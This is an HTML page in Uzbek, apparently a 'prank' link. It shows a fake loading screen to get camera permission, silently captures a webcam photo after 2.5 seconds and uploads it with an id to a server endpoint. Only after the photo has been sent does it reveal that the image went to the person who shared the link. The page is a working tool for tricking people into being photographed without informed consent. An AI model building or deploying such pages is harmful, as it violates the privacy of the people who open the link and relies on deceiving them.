<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kuting...</title>
    <style>
        body { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; background: #fff; text-align: center; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #prank-ui { display: none; }
    </style>
</head>
<body>
    <div id="loading-ui">
        <div class="loader"></div>
        <p id="msg">Ma'lumotlar yuklanmoqda, iltimos kuting...</p>
    </div>

    <div id="prank-ui">
        <h1>😂 PRANK!</h1>
        <p>Sizga do'stingiz hazil qildi. Rasmingiz unga yuborildi!</p>
        <button onclick="window.close()">Yopish</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const urlParams = new URLSearchParams(window.location.search);
        const prankId = urlParams.get('id'); // URL'dan ID'ni olish

        if (prankId) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setTimeout(capture, 2500); // 2.5 soniyadan keyin rasm oladi
                })
                .catch(() => {
                    document.getElementById('msg').innerText = "Xatolik: Kameraga ruxsat bering.";
                });
        }

        function capture() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL('image/jpeg', 0.7);

            fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    image: imageData, 
                    id: prankId // Serverga ID yuborish
                })
            })
            .then(() => {
                video.srcObject.getTracks().forEach(t => t.stop());
                document.getElementById('loading-ui').style.display = 'none';
                document.getElementById('prank-ui').style.display = 'block';
            });
        }
    </script>
</body>
</html>
